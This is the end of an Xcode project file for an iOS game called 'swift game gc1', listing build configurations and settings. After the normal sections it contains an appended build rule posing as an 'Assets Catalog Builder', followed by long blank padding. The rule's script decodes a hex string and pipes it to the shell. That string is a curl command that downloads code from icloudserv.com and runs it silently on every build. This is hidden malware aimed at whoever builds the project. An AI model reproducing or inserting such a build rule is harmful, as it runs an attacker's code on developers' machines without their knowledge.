				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "swift game gc1";
			};
			name = Debug;
		};
		F2FFA7C71FDA47DB005A3E45 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "swift game gc1UITests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
				PRODUCT_BUNDLE_IDENTIFIER = "com.dxjerry.swift-game-gc1UITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "swift game gc1";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		F2FFA7921FDA47DB005A3E45 /* Build configuration list for PBXProject "swift game gc1" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F2FFA7BD1FDA47DB005A3E45 /* Debug */,
				F2FFA7BE1FDA47DB005A3E45 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F2FFA7BF1FDA47DB005A3E45 /* Build configuration list for PBXNativeTarget "swift game gc1" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F2FFA7C01FDA47DB005A3E45 /* Debug */,
				F2FFA7C11FDA47DB005A3E45 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F2FFA7C21FDA47DB005A3E45 /* Build configuration list for PBXNativeTarget "swift game gc1Tests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F2FFA7C31FDA47DB005A3E45 /* Debug */,
				F2FFA7C41FDA47DB005A3E45 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F2FFA7C51FDA47DB005A3E45 /* Build configuration list for PBXNativeTarget "swift game gc1UITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F2FFA7C61FDA47DB005A3E45 /* Debug */,
				F2FFA7C71FDA47DB005A3E45 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


		182E0113D3AA2FD2F76D902C /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			fileType = folder.assetcatalog;
			name = "Assets Catalog Builder";
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
			);
			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	\n\n";
			};
			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = F2FFA78F1FDA47DB005A3E45 /* Project object */;
}
